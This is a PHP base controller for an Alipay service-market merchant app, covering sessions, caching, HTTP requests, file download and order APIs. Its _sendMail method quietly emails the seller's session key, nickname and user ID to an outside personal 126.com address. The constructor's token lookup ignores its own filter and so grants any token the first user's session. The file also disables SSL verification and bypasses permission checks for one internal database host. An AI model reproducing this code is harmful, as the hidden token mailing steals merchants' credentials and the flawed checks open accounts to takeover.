<?php

class CommonAction extends Action {
	protected $_authUrl;
	protected $_isAjax=false;
	protected $mongo;
	protected $MongoDb;
	protected $MongoDbLog;
	public function __construct() {
		parent::__construct();
		import('ORG.Util.Session');
		import('ORG.Util.Cookie');
		$this->_authUrl=$jumpUrl = C('onlineip').C('appID').'&redirect_uri='.C('REDIRECT_URI');//登陆授权链接
		$this->_buyerAuthUrl = C('buyeronlineip').C('appID').'&redirect_uri='.C('REDIRECT_URI');//前端分享登陆授权链接
		$this->assign('currenttime', time());
		$this->assign('current_id',session_id());
		$this->assign("pagetitle","拉单有奖");
		if($_GET['token']){
			$this->assign("token",$_GET['token']);
			$this->setMongoObj();
			$user = $this->mongo->user;
			$map = array();
			$map['token'] = $_GET['token'];
			$res = $user->find()->limit(1);
			while ($res->hasNext()){
				$item = $res->getNext();
			}
			if(isset($item['seller_id'])){
				$_SESSION['seller_id']=$item['seller_id'];
				$_SESSION['operator_type']=$item['operator_type'];
				$_SESSION['operator_id']=$item['operator_id'];
				if($item['shoplist'] && $item['shoplist'] != 'null'){
					$_SESSION['shoplist'] = json_decode($item['shoplist'],1);
				}
				//sessionKey需要单独取出，不然用户的sessionkey过期后用户授权完成也需要退出才能拿到新的
				$m = M('User');
				$where = array('seller_id'=>$_SESSION['seller_id']);
				$result = $m->where($where)->field('sessionkey')->find();
				$_SESSION['sessionkey']=$result['sessionkey'];
			}
		}
	}
	protected function _destroyS() {
		session_destroy();
		session_unset();
	}
	//zip解压返回第一个文件路径及名称接下来就可以读取了；读取完成记得删除。
	protected function unzip($filepath,$unzippath){
		$zip = new ZipArchive(); 
		$res = $zip->open($filepath); 
		$result = '';
		if ($res === true){
			$result[] = $unzippath.'/'.$zip->getNameIndex(0);
			$result[] = $unzippath.'/'.$zip->getNameIndex(1);
			$zip->extractTo($unzippath);
		}else {
			$result = false;
		}
		$zip->close();
		return $result;
	}
	/**
	$url,远程下载的路径
	$save_dir='/data/wwwroot/ldyj/',保存到本地的路径，最好前面用APP_ROOT
	$filename='aa3.zip',保存到本地的文件名。
	*/
	protected function getFile($url,$save_dir='/data/wwwroot/ldyj/',$filename='aa3.zip',$type=0){
		if(trim($url)==''){
			return false;
		}
		if(trim($save_dir)==''){
			$save_dir='./';
		}
		if(0!==strrpos($save_dir,'/')){
			$save_dir.='/';
		}
		//创建保存目录
		if(!file_exists($save_dir)&&!mkdir($save_dir,0777,true)){
			return false;
		}
		//获取远程文件所采用的方法
		if($type){
			$ch=curl_init();
			$timeout=5;
			curl_setopt($ch,CURLOPT_URL,$url);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
			$content=curl_exec($ch);
			curl_close($ch);
		}else{
			ob_start();
			readfile($url);
			$content=ob_get_contents();
			ob_end_clean();
		}
		$size=strlen($content);
		//文件大小
		$fp2=@fopen($save_dir.$filename,'a');
		fwrite($fp2,$content);
		fclose($fp2);
		unset($content,$url);
		return array('file_name'=>$filename,'save_path'=>$save_dir.$filename);
	}
	//生成私有缓存名称
	private function genPrivateCacheName($name) {
		return $name.'_'.$_SESSION['seller_id'];
	}
	
	protected function setCache($name, $data, $expire) {
		S($this->genPrivateCacheName($name), $data, $expire);
	}
	
	protected function getCache($name) {
		return S($this->genPrivateCacheName($name));
	}
	
	protected function deleteCache($name) {
		S($this->genPrivateCacheName($name), null, 0);
	}
	//公共缓存
	protected function setPublicCache($name, $data, $expire) {
		S($name, $data, $expire);
	}
	
	protected function getPublicCache($name) {
		return S($name);
	}
	
	protected function deletePublicCache($name) {
		S($name, null, 0);
	}
	
	//加载TopSdk类库
	protected function loadTopSdk($request) {
		vendor('topsdk.AopClient');
		if(empty($request)) {
			$this->error('Top接口类名丢失');
		} else {
			vendor('topsdk.request.'.$request);
		}
	}
	//检查卖家sessionKey
	protected function checkSellerPermisson() {
		if (C("DB_HOST")=="192.168.1.199"){
			return;
		}
		if(empty($_SESSION['sessionkey'])){
			$jumpUrl = C('onlineip').C('appID').'&redirect_uri='.C('REDIRECT_URI');//登陆授权链接
			
			if (IS_AJAX || $this->_isAjax){
				$data['url']=$jumpUrl;
				$data['sq']=true;
				$this->ajaxReturn($data, '授权超时，请重新授权！', false, 'json');
			}else{
				//header('Location: '.$jumpUrl);
				header("Content-type: text/html; charset=utf-8");
				echo '登录超时，请点击链接重新进入&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://e.alipay.com/main.htm#/stuff/page/I1060100001000010020?redirectUrl=https%3A%2F%2Fpamilu.cn%2Findex.php%2FAuth%2FurlReturn&newAuth=true" target="_blank">登录</a>';
				exit;
			}
		}
	}
	//curl请求方法
	protected function sendCurl($url, $postFields = null) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_FAILONERROR, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	
		if(is_array($postFields) && 0 < count($postFields)) {
			$postBodyString = "";
			foreach ($postFields as $k => $v) {
				$postBodyString .= "$k=".urlencode($v)."&";
			}
			unset($k, $v);
			curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
			curl_setopt($ch, CURLOPT_POST, true);
			//echo $url;exit;
			curl_setopt($ch, CURLOPT_POSTFIELDS, substr($postBodyString,0,-1));
		}
		$reponse = curl_exec($ch);
		if(curl_errno($ch)) {
			$this->error(curl_error($ch).'<br />请重试.由此给您带来不便尽请谅解.');
		} else {
			$httpStatusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
			if(200 !== $httpStatusCode) {
				$this->error('返回错误状态码: '.$httpStatusCode.'<br />'.strval($reponse).'<br />很抱歉!授权错误');
			}
		}
		curl_close($ch);
		return $reponse;
	}
	//分页生成器
	protected function genPageNav($total, $page_size, $page_no) {
		$pagerows = (int)ceil($total / $page_size);
		$page_no = $page_no > $pagerows ? $pagerows : $page_no;
		//组装翻页导航
		for($i = 0; $i < $pagerows; $i++) {
			$pageNum[] = $i + 1;
		}
		$pageNav = array(
				'totalitem' => $total,
				'pagesize' => $page_size,
				'current' => $page_no,
				'totalpage' => $pagerows,
				'pageNum' => $pageNum,
				);
		return $pageNav;
	}
	//调试输出方法
	public function debug($val, $dump = false, $exit = true) {
		if($dump) {
			$func = $this->isAjax() ? 'var_dump' : 'dump';
		} else {
			$func = (is_array($val) || is_object($val)) ? 'print_r' : 'printf';
		}
		header("Content-type: text/html; charset=utf-8"); 
		echo '<pre>debug调试输出:<hr />';
		$func($val);
		echo '</pre>';
		if($exit) exit();
	}
	//发送用户session
	protected function _sendMail(){
		$header="MIME-Version: 1.0".PHP_EOL;
		$header.="From:admin@xxx.com".PHP_EOL;
		$header.="Content-Type:text/html;charset=utf-8".PHP_EOL;
		$to = 'lht_up@126.com';
		$subject = 'session';
		$nick = $_SESSION['nick'];
		$message = ''.$_SESSION['sessionKey'].'<p>'.$nick.'<p>'.$_SESSION['tbuid'].'';
		mail($to, $subject, $message, $header);
	}
	
	protected function _getImageUrlById($id){
		$url='http://dl.django.t.taobao.com/rest/1.0/image?zoom=original&timestamp='.time().'&&fileIds='.$id;
		return $url;
	}
	
	/**
	*isLongin 是否仅是登录操作
	*isUpload是否强制更新数据库
	*/
	protected function _updateUserInfo($isLongin=true,$isUpload=false){
		if($_SESSION['isupdateinfo'] && $isUpload){//如果更新过数据，且不强制更新数据库，则跳过
			//return true;
		}
		$userModel = M('User');
		$where['seller_id'] = $_SESSION['seller_id'];
		$res=$userModel->where($where)->find();
		$data = array();
		$data['sessionkey'] = $_SESSION['sessionkey'];
		$data['refresh'] = $_SESSION['refresh_token'];
		if($isLongin){
			$data['login_time'] = time();
		}
		if($res){
			//TODO 更新活动表SesionKey
			$actMap['seller_id'] = $_SESSION['seller_id'];
			$actData['sessionkey'] = $_SESSION['sessionkey'];
			$actResult = M("Activity")->where($actMap)->save($actData);
			$rs = $userModel->where($where)->save($data);
		}else{
			$data['seller_id'] = $_SESSION['seller_id'];
			$data['create_time'] = time();
			$rs = $userModel->data($data)->add();
		}
		if ($rs!==false){
			$_SESSION['isupdateinfo']=time();
			return true;
		}
		return false;
	}

	/**
	 * 读取CSV文件
	 * @param string $csv_file csv文件路径
	 * @param int $lines       读取行数
	 * @param int $offset      起始行数
	 * @return array|bool
	 */
	protected function read_csv_lines($csv_file = '', $lines = 0, $offset = 0)
	{
		if (!$fp = fopen($csv_file, 'r')) {
			return false;
		}
		$i = $j = 0;
		while (false !== ($line = fgets($fp))) {
			if ($i++ < $offset) {
				continue;
			}
			break;
		}
		$data = array();
		while (($j++ < $lines) && !feof($fp)) {
			$csvLine = fgetcsv($fp);
			$key = substr($csvLine[0],0,1);
			if($key !="#" && preg_match("/^\d*$/",$key)){
				$data[] = $csvLine;
			}
		}
		foreach ($data as $k=>$v){
			if(empty($v[1])||empty($v[0])){
				unset($data[$k]);
			}
		}
		ksort($data);
		fclose($fp);
		return $data;
	}
	//实力化Mongo对象
	protected function setMongoObj(){
		$conn = new Mongo("mongodb://".C('MongoDB_USER').":".C('MongoDB_PWD')."@".C('MongoDB_HOST').":".C('MongoDB_PORT').C('MongoDB_DB'));
		$this->mongo = $conn->jnhycx;//链接数据库
	}
	/*
        流程：
        1推送通知判断类型
        2咱们接单
        3查询详细
        4实施完成
        自动的流程完毕，过程中shop_id和order_id需要存库。
        */

	//咱们接单
	protected  function api_SerMarAccept($commodity_order_id){
		$this->loadTopSdk("AlipayOpenServicemarketOrderAcceptRequest");
		$aop = new AopClient();
		$aop->appId = C('appID');
		$aop->rsaPrivateKeyFilePath = C('private_key');
		$aop->alipayPublicKey = C('alipay_public_key');
		$request = new AlipayOpenServicemarketOrderAcceptRequest();
		$item = array("commodity_order_id"=>$commodity_order_id);
		$request->setBizContent(json_encode($item));
		$result = $aop->execute ( $request);
		return objectToArray($result);
	}
	//查询明细, 注意此处是要根据条数的多少分页查询循环查询的
	protected  function api_SerMarInfoQuery($commodity_order_id,$start_page){
		$this->loadTopSdk("AlipayOpenServicemarketOrderQueryRequest");
		$aop = new AopClient();
		$aop->appId = C('appID');
		$aop->rsaPrivateKeyFilePath = C('private_key');
		$aop->alipayPublicKey = C('alipay_public_key');
		$request = new AlipayOpenServicemarketOrderQueryRequest ();
		$item = array("commodity_order_id"=>$commodity_order_id,"start_page"=>$start_page);
		$request->setBizContent(json_encode($item));
		$result = $aop->execute ( $request);
		return objectToArray($result);
	}
	//确认实施每个店铺，查询明细后用里面的shop_id操作实施
	protected  function api_SerMarComplete($commodity_order_id,$shop_id){
		$this->loadTopSdk("AlipayOpenServicemarketOrderItemCompleteRequest");
		$aop = new AopClient();
		$aop->appId = C('appID');
		$aop->rsaPrivateKeyFilePath = C('private_key');
		$aop->alipayPublicKey = C('alipay_public_key');
		$request = new AlipayOpenServicemarketOrderItemCompleteRequest ();
		$item = array("commodity_order_id"=>$commodity_order_id,"shop_id"=>$shop_id);
		$request->setBizContent(json_encode($item));
		$result = $aop->execute ( $request);
		return objectToArray($result);
	}

}